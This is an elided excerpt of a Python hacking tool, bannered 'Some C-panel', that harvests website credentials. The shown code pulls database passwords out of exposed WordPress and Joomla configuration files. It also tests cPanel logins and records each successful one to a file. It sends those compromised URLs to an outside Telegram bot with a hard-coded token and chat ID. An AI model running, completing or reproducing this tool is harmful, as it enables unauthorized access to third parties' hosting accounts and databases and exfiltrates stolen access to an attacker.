            ...
            if '.txt' in str(homereq.content) and (' 0k' not in str(homereq.content)):
                ...
                if 'MisterSpyV2Bruter' in str(get):
                    ...
                    for i in configs:
                        if 'WORDPRESS' in i:
                            r = requests.get(i)
                            uu = re.findall(r"define\('DB_PASSWORD', '(.*?)'\);", r.content)
                            aa = ''.join(uu)
                            passw += aa + '\r\n'
                            print (uu)
                        elif 'JOOMLA' in i:
                            r = requests.get(i)
                            uu = re.findall(r"public \$password = '(.*?)';", r.content)
                            zz = ''.join(uu)
                            passw += zz + '\r\n'
                            print (uu)
...
def cpcheck(url):
    try:
        ...
        if 'security_token' in str(req.content):
            print(fg+"[+] " + domain + " ==> Login Successful!")
            with open('cp_loginok.txt', 'a') as file:
                file.write(url + "\n")
            telegram_url = 'https://api.telegram.org/bot7169160278:AAH058Pc_LWpnHvfiG7o9JdsvcnlLWJUiDI/sendMessage'
            telegram_params = {
                'chat_id': '6636799203',
                'text': url
            }
...
def main():
 ...
 _____                         _____                              _   
/  ___|                       /  __ \                            | |  
\ `--.  ___  _ __ ___   ___   | /  \/_____ _ __   __ _ _ __   ___| |  
 `--. \/ _ \| '_ ` _ \ / _ \  | |  |______| '_ \ / _` | '_ \ / _ \ |  
/\__/ / (_) | | | | | |  __/  | \__/\     | |_) | (_| | | | |  __/ |  
\____/ \___/|_| |_| |_|\___|   \____/     | .__/ \__,_|_| |_|\___|_|  
                                          | |                         
                                          |_|                         
Created By=t.me/Somecp
    """
    print (fg + Banner + fg)
...
if __name__ == '__main__':
    checkupdate()
    main()
    print ('Thank You For Using My Tool Join Us t.me/Somecp')
